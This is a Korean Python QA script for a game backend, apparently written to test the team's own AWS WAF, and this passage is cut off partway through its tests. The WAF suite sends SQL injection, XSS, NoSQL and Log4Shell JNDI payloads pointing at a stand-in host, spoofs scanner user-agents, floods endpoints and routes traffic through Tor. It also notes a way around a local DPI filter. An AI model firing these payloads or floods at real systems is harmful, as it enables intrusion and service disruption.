# ==========================================
# 🛡️ Vamserlike 통합 QA 테스트 툴 (v6)
# ==========================================
# v5 → v6 변경점:
#   - (단일 파일화) WAF 보안 테스트(13케이스)를 이 파일에 인라인 통합.
#     이제 waf_security_test.py 없이 QA_Tool_Final.py 하나만으로 동작한다.
#
# v4 → v5 변경점:
#   - (통합) WAF 보안 테스트(13케이스)를 메뉴 6번으로 통합.
#     기능 QA는 BASE_URL(백엔드)을, WAF 테스트는 WAF_TARGET_URL(ALB)을 대상으로 한다.
#     CI에서는 `--waf` 플래그로 WAF 스위트만 단독 실행 가능.
#
# v3 → v4 변경점:
#   1. (복원) 캐릭터 해금 시나리오 추가 — 팀 요청 핵심 기능
#   2. (복원) bypass-login 검증 시나리오 추가
#   3. (복원) reset-test-data 전체 초기화 메뉴 추가
#   4. _delete_test_user 에 email 속성 검색 폴백 추가 (유저 잔존 방지)
#   5. 응답 json() 파싱 안전화 (_unwrap 헬퍼)
#   6. 데이터 무결성 검증 강화 (gold 누적 / selectedCharacterId 유지 추가)
#
# 시나리오 구성:
#   1. 인증 정상 흐름      : 실제 signup→인증→login→init→me (실 엔드포인트 검증)
#   2. 데이터 무결성       : bypass-login 셋업 후 2판 누적·갱신 정밀 검증
#   3. bypass-login 검증   : 강제 로그인이 init까지 끝내는지 확인
#   4. 캐릭터 해금         : 골드 차감 실측 + 중복 해금 멱등성
# ==========================================

import os
import sys
import random
import string
from pathlib import Path

## ★ 부모 폴더(루트)의 config.py를 찾을 수 있게 경로 추가
_ROOT = str(Path(__file__).resolve().parent.parent)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

import time
from dataclasses import dataclass, field
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import boto3
import requests

# 루트 config 로드 (UNLOCK_TARGET_CHARACTER_ID, RESET_CONFIRM_TEXT 는 config v3 필요)
from config import (
    BASE_URL,
    BOTO_CONFIG,
    REGION,
    RESET_CONFIRM_TEXT,
    TEST_PW,
    UNLOCK_TARGET_CHARACTER_ID,
    USER_POOL_ID,
)

cognito = boto3.client("cognito-idp", region_name=REGION, config=BOTO_CONFIG)


# ==========================================
# 테스트 결과 수집기
# ==========================================
@dataclass
class TestResult:
    name: str
    passed: bool
    detail: str = ""


@dataclass
class TestReport:
    results: list[TestResult] = field(default_factory=list)

    def record(self, name: str, passed: bool, detail: str = ""):
        status = "🟢 Pass" if passed else "🔴 Fail"
        print(f"  {status} │ {name}")
        if detail:
            print(f"         │ → {detail}")
        self.results.append(TestResult(name, passed, detail))

    def warn(self, name: str, detail: str = ""):
        """판정 불가/주의 항목 (실패로 집계하지 않음)"""
        print(f"  🟡 Warn │ {name}")
        if detail:
            print(f"         │ → {detail}")

    def summary(self) -> bool:
        total = len(self.results)
        if total == 0:
            return True

        passed = sum(1 for r in self.results if r.passed)
        failed = total - passed

        print("\n" + "=" * 55)
        print("📋 통합 QA 테스트 결과 요약")
        print("=" * 55)
        for r in self.results:
            mark = "✅" if r.passed else "❌"
            print(f"  {mark} {r.name}")
            if not r.passed and r.detail:
                print(f"      → {r.detail}")
        print("-" * 55)
        print(f"  합계: {total}건  |  통과: {passed}건  |  실패: {failed}건")
        print("=" * 55)
        return failed == 0


# ==========================================
# 공통 유틸리티
# ==========================================
def _delete_test_user(email: str):
    """테스트 유저 정리. username==email 직접 삭제 → 실패 시 email 속성 검색."""
    email = email.lower()
    try:
        cognito.admin_delete_user(UserPoolId=USER_POOL_ID, Username=email)
        return
    except cognito.exceptions.UserNotFoundException:
        pass
    except Exception:
        pass

    # 폴백: username이 UUID인 풀 대비, email 속성으로 검색하여 삭제
    try:
        resp = cognito.list_users(
            UserPoolId=USER_POOL_ID, Filter=f'email = "{email}"', Limit=1
        )
        for user in resp.get("Users", []):
            cognito.admin_delete_user(UserPoolId=USER_POOL_ID, Username=user["Username"])
    except Exception:
        pass


def _unwrap(res) -> dict:
    """응답을 안전하게 json 파싱하고 ApiResponse<T>의 data를 꺼냅니다."""
    try:
        body = res.json()
    except Exception:
        return {}
    if isinstance(body, dict):
        d = body.get("data", body)
        return d if isinstance(d, dict) else {}
    return {}


def _extract_login_token(res) -> str | None:
    """login 응답(data.idToken)에서 토큰 추출."""
    try:
        body = res.json()
    except Exception:
        return {}
    if not isinstance(body, dict):
        return None
    return body.get("data", {}).get("idToken") or body.get("idToken")


def _extract_bypass_token(res) -> str | None:
    """bypass-login 응답(data.auth.idToken)에서 토큰 추출."""
    try:
        body = res.json()
    except Exception:
        return None
    data = body.get("data", body) if isinstance(body, dict) else {}
    auth = data.get("auth", {}) if isinstance(data, dict) else {}
    token = auth.get("idToken") if isinstance(auth, dict) else None
    return token or (data.get("idToken") if isinstance(data, dict) else None)


def _bypass_provision(email: str, nickname: str):
    """bypass-login으로 유저 생성+인증+로그인+init 일괄 처리 → headers 반환(실패 시 None)."""
    res = requests.post(
        f"{BASE_URL}/api/dev/bypass-login",
        json={"email": email, "password": TEST_PW, "nickname": nickname},
    )
    if res.status_code != 200:
        return None
    token = _extract_bypass_token(res)
    if not token:
        return None
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


# ==========================================
# 시나리오 1: 인증 시스템 정상 흐름 (Happy Path)
# ==========================================
# 실제 /api/Auth/signup 엔드포인트를 검증해야 하므로 bypass-login을 쓰지 않습니다.
def test_auth_happy_path(report: TestReport):
    email = f"qa_auth_{int(time.time() * 1000)}@test.com"

    print(f"\n{'=' * 55}")
    print(f"🔐 [시나리오 1] 인증 정상 흐름 검증 ({email})")
    print("=" * 55)

    try:
        # 1) 회원가입
        res_signup = requests.post(
            f"{BASE_URL}/api/Auth/signup",
            json={"email": email, "password": TEST_PW},
        )
        report.record("회원가입 요청 (200/201)", res_signup.status_code in (200, 201),
                      f"실제: {res_signup.status_code}")
        if res_signup.status_code not in (200, 201):
            return

        # 2) Cognito 강제 인증
        cognito.admin_confirm_sign_up(UserPoolId=USER_POOL_ID, Username=email)

        # 3) 로그인 & 토큰 추출
        res_login = requests.post(
            f"{BASE_URL}/api/Auth/login",
            json={"email": email, "password": TEST_PW},
        )
        token = _extract_login_token(res_login)
        report.record("로그인 및 토큰 발급", token is not None,
                      "토큰 없음" if not token else "")
        if not token:
            return

        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

        # 4) 초기화 (Init)
        res_init = requests.post(f"{BASE_URL}/api/players/me/init", headers=headers)
        report.record("프로필 초기화 /init (200/204)", res_init.status_code in (200, 204),
                      f"실제: {res_init.status_code}")

        # 5) 내 정보 조회 (Me)
        res_me = requests.get(f"{BASE_URL}/api/players/me", headers=headers)
        report.record("내 정보 조회 /me (200)", res_me.status_code == 200,
                      f"실제: {res_me.status_code}")

    except Exception as e:
        report.record("인증 시나리오 실행", False, f"예외 발생: {e}")
    finally:
        _delete_test_user(email)
        print("  🧹 테스트 유저 정리 완료")


# ==========================================
# 시나리오 2: 게임 데이터 무결성 (Integrity)
# ==========================================
def test_data_integrity(report: TestReport):
    email = f"qa_data_{int(time.time() * 1000)}@test.com"

    g1 = {"score": 2500, "level": 15, "playedCharacterId": "potato_farmer", "isClear": True}
    g2 = {"score": 1200, "level": 8,  "playedCharacterId": "rice_farmer",   "isClear": True}
    # 기대: bestScore=2500(유지), highestLevel=15(유지), gold=3700(누적),
    #       lastPlayedChar=rice_farmer(매판 갱신), selectedChar=potato_farmer(최고점수때만),
    #       totalPlayCount=2

    print(f"\n{'=' * 55}")
    print(f"📊 [시나리오 2] 데이터 무결성 검증 ({email})")
    print("=" * 55)

    try:
        # 셋업: bypass-login 한 콜 (init 포함)
        headers = _bypass_provision(email, "data_tester")
        report.record("bypass-login 셋업", headers is not None,
                      "셋업 실패" if headers is None else "")
        if headers is None:
            return

        # --- 1판 ---
        print(f"\n📌 1판 저장 (점수:{g1['score']}, 레벨:{g1['level']})")
        r1 = requests.put(f"{BASE_URL}/api/players/me/progress", json=g1, headers=headers)
        report.record("1판 결과 저장 (200/204)", r1.status_code in (200, 204), f"실제: {r1.status_code}")

        p1 = _unwrap(requests.get(f"{BASE_URL}/api/players/me", headers=headers))
        report.record(f"bestScore == {g1['score']}", p1.get("bestScore") == g1["score"], f"서버값: {p1.get('bestScore')}")
        report.record(f"highestLevel == {g1['level']}", p1.get("highestLevel") == g1["level"], f"서버값: {p1.get('highestLevel')}")
        report.record(f"gold == {g1['score']}", p1.get("gold") == g1["score"], f"서버값: {p1.get('gold')}")
        report.record("selectedCharacterId == potato_farmer", p1.get("selectedCharacterId") == g1["playedCharacterId"], f"서버값: {p1.get('selectedCharacterId')}")
        report.record("totalPlayCount == 1", p1.get("totalPlayCount") == 1, f"서버값: {p1.get('totalPlayCount')}")

        # --- 2판 (더 낮은 점수) ---
        print(f"\n📌 2판 저장 (점수:{g2['score']}, 레벨:{g2['level']})")
        r2 = requests.put(f"{BASE_URL}/api/players/me/progress", json=g2, headers=headers)
        report.record("2판 결과 저장 (200/204)", r2.status_code in (200, 204), f"실제: {r2.status_code}")

        p2 = _unwrap(requests.get(f"{BASE_URL}/api/players/me", headers=headers))
        report.record(f"bestScore 유지 == {g1['score']}", p2.get("bestScore") == g1["score"], f"서버값: {p2.get('bestScore')}")
        report.record(f"highestLevel 유지 == {g1['level']}", p2.get("highestLevel") == g1["level"], f"서버값: {p2.get('highestLevel')}")
        report.record("gold 누적 == 3700", p2.get("gold") == g1["score"] + g2["score"], f"서버값: {p2.get('gold')}")
        report.record(f"lastPlayedCharacterId 갱신 == {g2['playedCharacterId']}", p2.get("lastPlayedCharacterId") == g2["playedCharacterId"], f"서버값: {p2.get('lastPlayedCharacterId')}")
        report.record("selectedCharacterId 유지 == potato_farmer", p2.get("selectedCharacterId") == g1["playedCharacterId"], f"서버값: {p2.get('selectedCharacterId')}")
        report.record("totalPlayCount == 2", p2.get("totalPlayCount") == 2, f"서버값: {p2.get('totalPlayCount')}")

        # --- 랭킹 ---
        print("\n📌 랭킹 시스템 연동 확인")
        res_rank = requests.get(f"{BASE_URL}/api/players/ranking?take=5", headers=headers)
        report.record("랭킹 조회 성공 (200)", res_rank.status_code == 200, f"실제: {res_rank.status_code}")

    except Exception as e:
        report.record("무결성 시나리오 실행", False, f"예외 발생: {e}")
    finally:
        _delete_test_user(email)
        print("\n  🧹 테스트 유저 정리 완료")


# ==========================================
# 시나리오 3: bypass-login 검증
# ==========================================
def test_bypass_login(report: TestReport):
    email = f"qa_bypass_{int(time.time() * 1000)}@test.com"
    nickname = "bypass_tester"

    print(f"\n{'=' * 55}")
    print(f"🔑 [시나리오 3] bypass-login 강제 로그인 + 내부 init 검증 ({email})")
    print("=" * 55)

    try:
        res = requests.post(
            f"{BASE_URL}/api/dev/bypass-login",
            json={"email": email, "password": TEST_PW, "nickname": nickname},
        )
        report.record("bypass-login 200 응답", res.status_code == 200, f"실제: {res.status_code}")
        token = _extract_bypass_token(res)
        report.record("응답에 토큰 포함", token is not None, "토큰 추출 실패" if not token else "")
        if not token:
            return

        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

        # 별도 init 호출 없이 바로 /me 가 성공해야 함 (= 내부 init 완료)
        me = requests.get(f"{BASE_URL}/api/players/me", headers=headers)
        report.record("별도 init 없이 /me 조회 200", me.status_code == 200, f"실제: {me.status_code}")
        if me.status_code == 200:
            p = _unwrap(me)
            report.record("닉네임이 요청값과 일치", p.get("nickname") == nickname, f"서버값: {p.get('nickname')}")
            report.record("신규 유저 골드 0", p.get("gold") == 0, f"서버값: {p.get('gold')}")

    except Exception as e:
        report.record("bypass-login 시나리오 실행", False, f"예외 발생: {e}")
    finally:
        _delete_test_user(email)
        print("  🧹 테스트 유저 정리 완료")


# ==========================================
# 시나리오 4: 캐릭터 해금 (골드 차감 실측 + 멱등성)
# ==========================================
def test_character_unlock(report: TestReport):
    email = f"qa_char_{int(time.time() * 1000)}@test.com"

    print(f"\n{'=' * 55}")
    print(f"🎭 [시나리오 4] 캐릭터 해금 검증 ({email})")
    print("=" * 55)

    try:
        headers = _bypass_provision(email, "char_tester")
        report.record("bypass-login 셋업", headers is not None,
                      "셋업 실패" if headers is None else "")
        if headers is None:
            return

        # 1) 골드 충전 (넉넉히)
        EARN = 100000
        prog = requests.put(
            f"{BASE_URL}/api/players/me/progress",
            json={"score": EARN, "level": 1, "playedCharacterId": "rice_farmer", "isClear": True},
            headers=headers,
        )
        report.record("골드 충전 (200/204)", prog.status_code in (200, 204), f"실제: {prog.status_code}")
        gold_before = _unwrap(requests.get(f"{BASE_URL}/api/players/me", headers=headers)).get("gold", 0)

        # 2) 해금
        res = requests.put(
            f"{BASE_URL}/api/players/me/characters/unlock",
            json={"characterId": UNLOCK_TARGET_CHARACTER_ID},
            headers=headers,
        )
        report.record(f"해금 요청 200 ('{UNLOCK_TARGET_CHARACTER_ID}')", res.status_code == 200,
                      f"실제: {res.status_code} - {res.text[:120]}")
        if res.status_code != 200:
            return

        after = _unwrap(res)
        gold_after = after.get("gold", 0)
        unlocked = after.get("unlockedCharacterIds") or []
        actual_cost = gold_before - gold_after

        report.record("해금 캐릭터가 목록에 추가됨", UNLOCK_TARGET_CHARACTER_ID in unlocked, f"목록: {unlocked}")
        report.record("골드가 차감됨 (비용 > 0)", gold_after < gold_before, f"실측 비용: {actual_cost}")
        #report.record("선택 캐릭터 자동 지정 (최초 해금)",
                      #after.get("selectedCharacterId") == UNLOCK_TARGET_CHARACTER_ID,
                      #f"서버값: {after.get('selectedCharacterId')}")
        print(f"  ℹ️  실측된 '{UNLOCK_TARGET_CHARACTER_ID}' 해금 비용: {actual_cost} 골드")

        # 3) 멱등성: 같은 캐릭터 재해금 시 골드 이중 차감 없음
        second = requests.put(
            f"{BASE_URL}/api/players/me/characters/unlock",
            json={"characterId": UNLOCK_TARGET_CHARACTER_ID},
            headers=headers,
        )
        report.record("중복 해금도 200 반환", second.status_code == 200, f"실제: {second.status_code}")
        gold_after_second = _unwrap(second).get("gold", 0)
        report.record("중복 해금 시 골드 추가 차감 없음", gold_after_second == gold_after,
                      f"1차후: {gold_after}, 2차후: {gold_after_second}")

    except Exception as e:
        report.record("캐릭터 해금 시나리오 실행", False, f"예외 발생: {e}")
    finally:
        _delete_test_user(email)
        print("  🧹 테스트 유저 정리 완료")


# ==========================================
# 파괴적: 전체 테스트 데이터 초기화
# ==========================================
def reset_all_test_data():
    print("\n" + "🚨" * 20)
    print("위험: reset-test-data 는 DynamoDB 플레이어를 '전부' 삭제합니다.")
    print("      Cognito 유저까지 지우면 부하테스트용 1,000명 + 실제 계정도 모두 삭제됩니다!")
    print("🚨" * 20)

    confirm = input("\n정말 진행하려면 'DELETE_TEST_DATA' 를 그대로 입력하세요: ").strip()
    if confirm != RESET_CONFIRM_TEXT:
        print("  ❌ 확인 문구 불일치. 취소합니다.")
        return

    wipe = input("Cognito 유저도 전부 삭제할까요? (정말 위험) (y/N): ").strip().lower() == "y"
    try:
        res = requests.delete(
            f"{BASE_URL}/api/dev/reset-test-data",
            json={"confirmText": RESET_CONFIRM_TEXT, "deleteAllCognitoUsers": wipe},
        )
        if res.status_code == 200:
            d = _unwrap(res)
            print(f"\n  ✅ 초기화 완료")
            print(f"     - 삭제된 DB 플레이어: {d.get('deletedDbPlayers')}명")
            print(f"     - 삭제된 Cognito 유저: {d.get('deletedCognitoUsers')}명")
        else:
            print(f"  ❌ 실패: {res.status_code} - {res.text[:200]}")
    except Exception as e:
        print(f"  💥 예외: {e}")


# ==========================================
# 메인 실행 컨트롤러
# ==========================================
def run_all_tests() -> bool:
    report = TestReport()
    test_auth_happy_path(report)
    test_data_integrity(report)
    test_bypass_login(report)
    test_character_unlock(report)
    return report.summary()


# ==========================================
# ──────────────────────────────────────────
# 🛡️ WAF 보안 테스트 (인라인 통합 — 단일 파일)
#   대상: WAF_TARGET_URL(ALB/WAF). 기능 QA(BASE_URL=백엔드)와 대상이 다름.
#   차단=HTTP 403. 직접 정의 규칙은 'x-waf-rule' 헤더로 규칙명 식별,
#   관리형 룰셋은 헤더가 없어 '(관리형 룰셋)'으로 표시.
# ──────────────────────────────────────────
# ==========================================
WAF_TARGET_URL = os.environ.get("WAF_TARGET_URL", BASE_URL).rstrip("/")

PROXIES_GEO = {
    "인도": os.environ.get("PROXY_IN"),
    "남아프리카": os.environ.get("PROXY_ZA"),
    "싱가포르": os.environ.get("PROXY_SG"),
}
TOR_SOCKS = os.environ.get("TOR_SOCKS")

REQ_TIMEOUT = 10
WAF_BLOCK_CODE = 403
BLOCK_HEADER = "x-waf-rule"

# 속도 규칙 폴링 파라미터 (WAF 평가 지연 대응)
RATE_BURST = int(os.environ.get("RATE_BURST", "150"))
RATE_POLL_SECONDS = int(os.environ.get("RATE_POLL_SECONDS", "120"))
RATE_PROBE_INTERVAL = 5
RATE_REQ_TIMEOUT = int(os.environ.get("RATE_REQ_TIMEOUT", "5"))  # 죽은 백엔드에서 버스트가 느려지지 않게
RATE_WORKERS = int(os.environ.get("RATE_WORKERS", "1"))  # 1=단일 연결(같은 IP 보장, 권장). >1=병렬(단일 공인 IP 망에서만)


def _rule_label(rule):
    return rule if rule else "(관리형 룰셋)"


@dataclass
class WafReport:
    results: list = field(default_factory=list)

    def record(self, name, status, detail=""):
        icon = {"PASS": "🟢", "FAIL": "🔴", "SKIP": "🟡"}.get(status, "⚪")
        print(f"  {icon} {status:<4} │ {name}")
        if detail:
            print(f"            │ → {detail}")
        self.results.append((name, status))

    def summary(self):
        total = len(self.results)
        passed = sum(1 for _, s in self.results if s == "PASS")
        failed = sum(1 for _, s in self.results if s == "FAIL")
        skipped = sum(1 for _, s in self.results if s == "SKIP")
        print("\n" + "=" * 60)
        print("📋 WAF 보안 테스트 결과 요약")
        print("=" * 60)
        for name, s in self.results:
            mark = {"PASS": "✅", "FAIL": "❌", "SKIP": "⏭️"}.get(s, "•")
            print(f"  {mark} {name}")
        print("-" * 60)
        print(f"  합계 {total} │ 차단 확인(PASS) {passed} │ 미차단(FAIL) {failed} │ 건너뜀(SKIP) {skipped}")
        print("=" * 60)
        return failed == 0


def _rand_email(prefix="waf"):
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}@test.com"


def get_token():
    try:
        res = requests.post(
            f"{WAF_TARGET_URL}/api/dev/bypass-login",
            json={"email": _rand_email("waf_setup"), "password": TEST_PW, "nickname": "waf_tester"},
            timeout=REQ_TIMEOUT,
        )
        if res.status_code != 200:
            return None
        body = res.json()
        data = body.get("data", body) if isinstance(body, dict) else {}
        auth = data.get("auth", {}) if isinstance(data, dict) else {}
        return auth.get("idToken")
    except Exception:
        return None


def send_until_blocked(method, path, max_count, *, headers=None, json_body=None,
                       data=None, params=None, proxies=None):
    sent = 0
    for _ in range(max_count):
        sent += 1
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, params=params,
                proxies=proxies, timeout=REQ_TIMEOUT,
            )
        except Exception:
            continue
        if resp.status_code == WAF_BLOCK_CODE:
            return True, sent, resp.headers.get(BLOCK_HEADER)
    return False, sent, None


def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=None,
                              data=None, workers=20):
    def _one(_):
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, timeout=REQ_TIMEOUT,
            )
            return resp.status_code, resp.headers.get(BLOCK_HEADER)
        except Exception:
            return None, None

    blocked = False
    rule = None
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_one, i) for i in range(count)]
        for f in as_completed(futures):
            code, r = f.result()
            if code == WAF_BLOCK_CODE:
                blocked = True
                rule = r or rule
    return blocked, rule


def rate_test(method, path, *, headers=None, json_body=None):
    """버스트를 '단일 keep-alive 연결'로 순차 전송한다(RATE_WORKERS<=1, 기본값).
    이렇게 하면 모든 요청이 같은 출발 IP에서 나가, NAT 풀/CGNAT 환경에서도 WAF의
    'IP별 5분 100건' 카운트가 정상 누적된다. 401처럼 빠른 응답이면 수십 초면 한도 초과.
    RATE_WORKERS>1로 설정하면 병렬 전송(단일 공인 IP 망에서 더 빠르게).
    반환: (blocked, rule, info)"""

    responded = 0
    server_errors = 0
    blocked = False
    block_rule = None
    codes = Counter()

    def _account(code, rule):
        nonlocal responded, server_errors, blocked, block_rule
        if code is None:
            return
        responded += 1
        codes[code] += 1
        if code == WAF_BLOCK_CODE:
            blocked = True
            block_rule = rule or block_rule
        elif code >= 500:
            server_errors += 1

    if RATE_WORKERS <= 1:
        # 단일 연결(keep-alive) 순차 — 같은 출발 IP 보장
        sess = requests.Session()
        for _ in range(RATE_BURST):
            try:
                r = sess.request(method, f"{WAF_TARGET_URL}{path}",
                                 headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
                _account(r.status_code, r.headers.get(BLOCK_HEADER))
            except Exception:
                pass
        sess.close()
    else:
        def _one(_):
            try:
                r = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                     headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
                return r.status_code, r.headers.get(BLOCK_HEADER)
            except Exception:
                return None, None
        with ThreadPoolExecutor(max_workers=RATE_WORKERS) as ex:
            for code, rule in ex.map(_one, range(RATE_BURST)):
                _account(code, rule)

    failed = RATE_BURST - responded
    print(f"            │ … 버스트 {RATE_BURST}건: 응답 {responded}, 실패 {failed}, 상태 {dict(codes)}")

    if blocked:
        return True, block_rule, f"버스트 {RATE_BURST}건 중 차단"
    if responded == 0:
        return False, None, "대상에 연결 불가 — 폴링 생략"
    if responded < RATE_BURST * 0.5:
        return False, None, f"응답 {responded}/{RATE_BURST} — 요청 상당수 실패(네트워크 점검), 폴링 생략"
    if server_errors >= responded * 0.8:
        return False, None, f"응답 대부분이 5xx({server_errors}/{responded}) — 백엔드 점검 필요, 폴링 생략"

    print(f"            │ … 버스트 {RATE_BURST}건 완료, 최대 {RATE_POLL_SECONDS}초 폴링 중")
    deadline = time.time() + RATE_POLL_SECONDS
    while time.time() < deadline:
        time.sleep(RATE_PROBE_INTERVAL)
        try:
            resp = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                    headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
            if resp.status_code == WAF_BLOCK_CODE:
                waited = int(RATE_POLL_SECONDS - (deadline - time.time()))
                return True, resp.headers.get(BLOCK_HEADER), f"버스트 후 약 {waited}초 뒤 차단"
        except Exception:
            pass
    return False, None, f"{RATE_POLL_SECONDS}초 내 미차단"


def case_01_geo(report):
    print("\n[Case 1] 지역 기반 비정상 접근 (서비스 대상국 외 차단)")
    try:
        resp = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
        allowed_ok = resp.status_code != WAF_BLOCK_CODE
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "PASS" if allowed_ok else "FAIL",
                      f"본인 IP → /api/health {resp.status_code} (403이 아니어야 정상)")
    except Exception as e:
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "SKIP", f"요청 실패: {e}")

    configured = {k: v for k, v in PROXIES_GEO.items() if v}
    if not configured:
        report.record("Case 1. 서비스 대상국 외 차단", "SKIP",
                      "PROXY_IN(인도 VM SSH SOCKS 터널) 미설정 — 비허용국 출처 필요")
        return

    all_blocked = True
    last_rule = None
    for country, proxy in configured.items():
        proxies = {"http": proxy, "https": proxy}
        blocked, sent, rule = send_until_blocked("GET", "/api/health", 50, proxies=proxies)
        tag = f" / 차단규칙: {_rule_label(rule)}" if blocked else ""
        print(f"      - {country} ({proxy}): {'차단' if blocked else '통과(미차단)'} (전송 {sent}건){tag}")
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule

    report.record("Case 1. 서비스 대상국 외 차단", "PASS" if all_blocked else "FAIL",
                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")


def case_02_rate(report, token):
    print("\n[Case 2] 랭킹/해금 API 반복 호출 (속도 제한)")
    headers = {"Authorization": f"Bearer {token}"} if token else None

    blocked, rule, info = rate_test("GET", "/api/players/ranking?take=20", headers=headers)
    report.record("Case 2-1. 랭킹 조회 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)

    blocked, rule, info = rate_test("PUT", "/api/players/me/characters/unlock",
                                    headers=headers, json_body={"characterId": UNLOCK_TARGET_CHARACTER_ID})
    report.record("Case 2-2. 캐릭터 해금 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


def case_03_rate_progress(report, token):
    print("\n[Case 3] 게임 결과 저장 반복 전송 (속도 제한)")
    headers = {"Authorization": f"Bearer {token}"} if token else None
    payload = {"score": 1500, "level": 10, "playedCharacterId": "rice_farmer"}
    blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload)
    report.record("Case 3. 결과 저장 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


def case_04_injection(report):
    print("\n[Case 4] 악성 패턴 주입 (SQLi/XSS)")
    payloads = [
        "' OR 1=1 --",
        "; DROP TABLE Users --",
        "<script>document.cookie</script>",
        "<img onerror=alert(1)>",
    ]
    nosql_payloads = ['{"$gt": ""}', '{"$ne": null}']

    blocked_all = True
    for p in payloads:
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                       json_body={"email": p, "password": p})
        b2, _, r2 = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        hit = b1 or b2
        rule = r1 or r2
        tag = f" ({_rule_label(rule)})" if hit else ""
        print(f"      - {p[:30]!r}: {'차단' if hit else '통과'}{tag}")
        blocked_all = blocked_all and hit
    report.record("Case 4-1. SQLi/XSS 패턴 차단", "PASS" if blocked_all else "FAIL")

    nosql_blocked = 0
    for p in nosql_payloads:
        b, _, _ = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        if b:
            nosql_blocked += 1
    report.record("Case 4-2. NoSQL 패턴 차단 범위(실측)", "PASS",
                  f"{nosql_blocked}/{len(nosql_payloads)}건 차단 (실측 완료)")


def case_05_size(report):
    print("\n[Case 5] 대용량 페이로드 (요청 크기 제한)")
    BURST = int(os.environ.get("SIZE_TEST_BURST", "5"))
    big_body = "A" * (10 * 1024 * 1024)
    blocked, rule = send_parallel_any_blocked(
        "POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
    report.record("Case 5. 8KB 초과 요청 차단", "PASS" if blocked else "FAIL",
                  f"10MB × {BURST}건 전송, 차단규칙: {_rule_label(rule)}" if blocked else f"10MB × {BURST}건 전송")


def case_06_login_bruteforce(report):
    print("\n[Case 6] 로그인 무차별 대입 (속도 제한)")
    blocked, rule, info = rate_test("POST", "/api/Auth/login",
                                    json_body={"email": "brute@test.com", "password": "wrongpw"})
    report.record("Case 6. 로그인 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


def case_07_signup_flood(report):
    print("\n[Case 7] 계정 대량 생성 (속도 제한)")
    blocked, rule, info = rate_test("POST", "/api/Auth/signup",
                                    json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"})
    report.record("Case 7. 회원가입 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


def case_08_user_agent(report):
    print("\n[Case 8] 자동화 도구/스캐너 차단 (User-Agent)")
    user_agents = ["sqlmap/1.0", "Nikto/2.5", "zgrab/0.1", "Selenium/4.0", "Puppeteer/20.0"]
    all_blocked = True
    last_rule = None
    for ua in user_agents:
        blocked, _, rule = send_until_blocked(
            "GET", "/api/players/ranking", 1, headers={"User-Agent": ua}, params={"take": 20})
        tag = f" ({_rule_label(rule)})" if blocked else ""
        print(f"      - {ua}: {'차단' if blocked else '통과'}{tag}")
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule
    report.record("Case 8. 도구 User-Agent 차단", "PASS" if all_blocked else "FAIL",
                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")


def case_09_anonymous_ip(report):
    print("\n[Case 9] 익명 IP / Tor 차단")
    if not TOR_SOCKS:
        report.record("Case 9. Tor/익명 IP 차단", "SKIP",
                      "TOR_SOCKS 미설정 — 로컬 Tor SOCKS5 프록시 필요")
        return
    proxies = {"http": TOR_SOCKS, "https": TOR_SOCKS}
    blocked, sent, rule = send_until_blocked(
        "GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)

    if not blocked:
        report.record("Case 9. Tor/익명 IP 차단", "FAIL", f"Tor 경유 {sent}건 미차단")
        return
    if rule == "case1-geo-allowlist":
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      "Geo가 먼저 차단함 — AnonymousIpList 분리 검증은 미국 출구 노드(ExitNodes {us}) 사용 권장")
    else:
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      f"AnonymousIpList 차단 (관리형, 전송 {sent}건)")


def case_10_known_bad_inputs(report):
    print("\n[Case 10] 알려진 취약점 공격 패턴 차단")
    log4j = ["${jndi:ldap://malicious-test.com/a}", "${jndi:rmi://malicious-test.com/b}"]
    all_blocked = True

    # 안랩 로컬 차단(DPI) 우회: SOCKS5 프록시(인도 터널 또는 Tor)가 설정돼 있으면 암호화 터널로 우회 전송.
    proxy_url = PROXIES_GEO.get("인도") or TOR_SOCKS
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    for p in log4j:
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                       headers={"X-Test-Payload": p},
                                       json_body={"email": "a@test.com", "password": p},
                                       proxies=proxies)
        tag = f" ({_rule_label(r1)})" if b1 else ""
        print(f"      - {p[:40]!r}: {'차단' if b1 else '통과'}{tag}")
